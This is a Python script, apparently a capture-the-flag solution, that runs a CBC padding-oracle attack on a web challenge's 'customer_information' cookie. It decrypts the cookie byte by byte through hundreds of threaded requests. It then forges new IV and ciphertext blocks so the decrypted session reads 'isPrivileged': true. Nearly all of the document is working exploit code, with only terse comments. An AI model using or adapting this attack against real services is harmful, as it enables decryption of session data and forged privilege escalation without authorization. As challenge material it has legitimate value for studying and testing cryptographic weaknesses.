from multiprocessing.pool import ThreadPool
from base64 import b64encode, b64decode
from secrets import token_hex
from colorama import Fore
from requests import get
from time import time

def valid_iv(id, byte, cipher, iv):
    iv = list(bytes.fromhex(iv))
    iv[-1-byte] = (iv[-1-byte]+id)%256                                                                                 # incorrect padding -> modify byte i
    iv = bytearray(iv).hex()
    
    while True:                                                                                                        # retry until connection established
        try:
            response = get(url, timeout=2, cookies={
                "customer_information": b64encode(bytes.fromhex(iv+cipher)).decode()})
            break
        except:
            pass
    
    if "Decoding" not in response.text:                                                                                # correct padding
        return list(bytes.fromhex(iv))

def decrypt(first):
    global c1_decrypted
    
    for block in range((len(cookie)-32)//32):
        index = 32*block                                                                                               # 16 bytes
        decrypted = bytearray()
        iv = bytearray(bytes.fromhex(cookie[index:index+32]))                                                          # original iv
        iv_ = bytearray(bytes.fromhex(token_hex(16)))                                                                  # random iv'
        cipher = cookie[index+32:index+64]                                                                             # original cipher
        
        for byte in range(16):
            for index in range(len(decrypted)):
                iv_[-len(decrypted)+index] = decrypted[index]^byte+1                                                   # modify iv' for next plaintext byte
            
            with ThreadPool(128) as pool:   
                ivs = pool.starmap(valid_iv, [(i, byte, cipher, bytearray(iv_).hex()) for i in range(256)])            # find iv' with valid padding
            
            iv_ = [temp for temp in ivs if temp][0]
            
            decrypted.insert(0, iv_[-1-byte]^byte+1)                                                                   # iv' xor padding  = decrypted
            plaintext[16*block+15-byte] = iv[-1-byte]^decrypted[0]                                                     # iv xor decrypted = plaintext
            
            if first:
                print('\r' + Fore.LIGHTBLUE_EX + plaintext.decode(), end='\r')
            else:
                print(decrypted.hex(), end='\r')
            
            if block==1:
                c1_decrypted=decrypted.hex()                                                                           # saving for 2nd attack
    if first:
        return plaintext.decode()
    return decrypted.hex()

def first_flag(first):
    decrypted = decrypt(first)
    print()
    return decrypted

def second_flag(data):
    global cookie
    
    ''' C0 = dec(C1) XOR P1 '''
    p1 = ''.join(format(ord(c), '02x') for c in data["flag"][16:32])
    c0 = hex(int(c1_decrypted, 16) ^ int(p1, 16))[2:]
    if len(c0)%2 != 0:
        c0 = '0' + c0
    print("\nC0:\n" + c0)
    
    ''' Decrypt C0 => Oracle(Random IV | C0) '''
    cookie = token_hex(16) + c0 
    print("\nC0 decrypted:")
    c0_decrypted = first_flag(0)
    
    ''' IV = dec(C0) XOR P0 '''
    p0 = ''.join(format(ord(c), '02x') for c in data["flag"][0:16])
    iv = hex(int(c0_decrypted, 16) ^ int(p0, 16))[2:]
    if len(iv)%2 != 0:
        iv = '0' + iv
    print("\nIV:\n"+ iv)
    
    ''' Oracle(IV | C0 | C1 | C2 | C3 | C4 | C5 | C6) '''   
    cookie = b64encode(bytes.fromhex(iv+c0+data["cookie"][64:])).decode()
    print("\nCookie:", cookie)

if __name__ == "__main__":
    url          = "https://security-challenge.bmw-carit.de/fabulousmobility/technology"
    cookie       = b64decode(get(url).cookies["customer_information"]).hex()
    plaintext    = bytearray([32]*(((len(cookie)-16))//2))                                                             # 32 == " " (decimal)
    c1_decrypted = str()
    start        = time()

    print()
    first_flag(1)
    second_flag({"cookie": cookie,
        "flag": plaintext.decode().strip().replace('false', ' true')})                                                 # "isPrivileged":  true
    print(f"\n{int(time()-start)} Sekunden")
